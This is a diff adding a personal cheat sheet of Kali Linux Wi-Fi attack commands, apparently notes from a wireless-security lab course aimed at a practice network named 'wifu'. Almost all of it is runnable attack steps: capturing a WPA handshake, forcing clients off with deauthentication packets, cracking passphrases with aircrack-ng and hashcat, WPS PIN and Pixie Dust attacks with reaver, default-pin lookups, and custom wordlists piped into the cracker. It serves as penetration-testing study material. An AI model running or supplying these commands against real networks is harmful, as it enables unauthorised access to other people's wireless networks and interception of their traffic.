@@ -1,0 +1,180 @@
+airmon-ng check kill
+
+## install win-kex
+    apt install kali-win-kex
+    kex --sl -s (seamless mode)
+    
+#### CAPTURE METHOD #####
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon (if not working try without the -c parameter)
+aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
+wait for WPA HANDSHAKE // ctrl+c
+aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap (aircrack uses only CPU)
+airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap (this shows the -p is correct some how)
+# hashcat
+    sudo hashcat -a 3 -m 1800 hash ?a1?a?a?a -O -w 4
+    to convert cap to hccapx
+        hcxpcapngtool -o FILE.hc22000 INPUT.cap
+        hashcat -a 0 -m 22000 /wordlist -w4
+
+## Connect to network:
+    rfkill list (block\unblock)
+    airmon-ng check (kill)
+    ifconfig wlan0 up
+    ip link show wlan0 // see if the device is down
+      ip link set wlan0 up // if down (not the red down)
+    iw wlan0 scan | grep ESSID
+    wpa_passphrase "wifiNAME" "password" | tee wpa.conf
+                nano wpa.conf
+                  network={
+                      ssid="wifiNAME"
+                      #psk="password"
+                      psk="HASH"
+                    }
+      
+    wpa_supplicant -D wext -i wlan0 -c wpa.conf (if error try without "-D wext")
+    iw wlan0 link
+    ip addr show wlan0  // if no ip    You may need to run 'ip addr flush dev wlan0' && `dhclient wlan0`
+  
+
+## (WPS ATTACKS ) ##
+  airmon-ng start wlan0
+  wash -i wlan0mon
+  reaver -b MAC -i wlan0mon -v // regular attack
+  reaver -b MAC -i wlan0mon -v -K  // PIXIE ATTACK // this also shows WPA pass
+
+  ## default pins could possibly work
+    sudo apt install airgeddon
+    source /usr/share/airgeddon/known_pins.db
+    echo ${PINDB["0013F7"]}  // the 0013F7 is the first three bits of the BSSID
+
+
+
+## start monitor (AIRMON-NG) ##
+  airmon-ng start wlan0 (x) (add a number at end if you want to monitor a specific channel)
+
+    ## to confirm monitor mode
+      iw dev wlan0mon info  //or// iwconfig wlan0mon
+
+    ## stop monitor
+      airmon-ng stop wlan0mon
+
+## start (AIRODUMP-NG) ##
+  airodump-ng wlan0mon -c 2 (starts sniffing on channel 2)
+
+    ## precision sniffing 
+      airodump-ng -c --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon // sniffs channel 3 and outputs to cap1 file
+        --output-format // pcap, cvs, netxml
+        --vis // when sniffing WEP
+        -g // used with GPS
+
+    ## airodump has interactive mode
+      space // freezes output // space again continues real time capture
+      tab // enables scrolling with up/down keys
+      a // cycles display options
+      s // cycles through sorting
+      i and d // invert sorting
+  
+## unload and reload drivers
+  rmmod
+  modprobe
+  dmesg // check for errors
+  
+## (AIREPLAY-NG) ##
+
+  ## injection test
+    airmon-ng start wlan0
+    aireplay-ng -9 wlan0mon
+
+  ## inject test for specific ESSID and BSSID
+    aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon
+
+  ## card to card inject test (show what attacks a card can do)
+    sudo aireplay-ng -9 -i wlan1mon wlan0mon
+
+  ## live deauth messages for troubleshooting
+    tcpdump -n -e -s0 -vvv -i wlan0(mon)
+
+        Attack #
+        0	Deauthentication
+        1	Fake Authentication
+        2	Interactive Packet Replay
+        3	ARP Request Replay Attack
+        4	KoreK ChopChop Attack
+        5	Fragmentation Attack
+        6	Café-Latte Attack
+        7	Client-Oriented Fragmentation Attack
+        8	WPA Migration Mode Attack
+        9	Injection Test
+
+        Replay options
+        -x nbpps	Number of packets per second
+        -p fctrl	Set frame control word (hex)
+        -a bssid	Access point MAC address
+        -c dmac	Destination MAC address
+        -h smac	Source MAC address
+        -e essid	Target AP SSID
+        -j	arpreplay attack: inject FromDS packets
+        -g value	Change ring buffer size (default: 8)
+        -k IP	Destination IP in fragments
+        -l IP	Source IP in fragments
+        -o npckts	Number of packets per burst (-1)
+        -q sec	Seconds between keep-alives (-1)
+        -y prga	Keystream for shared key authentication
+        -B	Bit rate test
+        -D	Disable AP detection
+        -F	Chooses first matching packet
+        -R	Disables /dev/rtc usage
+  
+## (AIRCRACK-NG) ##
+
+  ## benchmark (uses CPU only)
+    aircrack-ng -S
+  
+## (AIRDECAP-NG) ##
+
+  ## remove wireless headers
+    sudo airdecap-ng -b 34:08:04:09:3D:38 opennet-01.cap
+  
+## (AIRGRAPH-NG) ##
+  
+  ## generate CAPR graph from sniffing // keep running for x mins
+    airgraph-ng -o Picture1_png -i dump-01.csv -g CAPR
+    
+  ## Client Probe Graph // shows relationships between clients and probed networks
+    airgraph-ng -o Picture2.png -i dump-01.csv -g CPG
+
+
+
+## if airmon is not working start in debug
+airmon-ng --verbose
+
+
+
+
+
+
+####  Password stuff
+
+##  (HASHCAT) ##
+  
+  ## display specifications
+    hashcat -I
+    
+  ## apt install hashcat-utils (cap2hccapx)
+    /usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
+
+## crunch 11 11 -t password%%% (crunch for 11 char mask // % numbers // @ lowercase // , uppercase // ^ symbols)
+  -p create unique list from values ( -p dog, cat, mouse)
+  crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w - (pipe crunch to aircrack)
+  
+## RSMangler (leetspeak)
+  rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w - (pipe into aircrack)
+  
+
+  
+
+## find the device manufacturer from the 1st three bytes of the BSSID (the OUI: organization uniqe id)
+  wireshark provides this info by default
+  
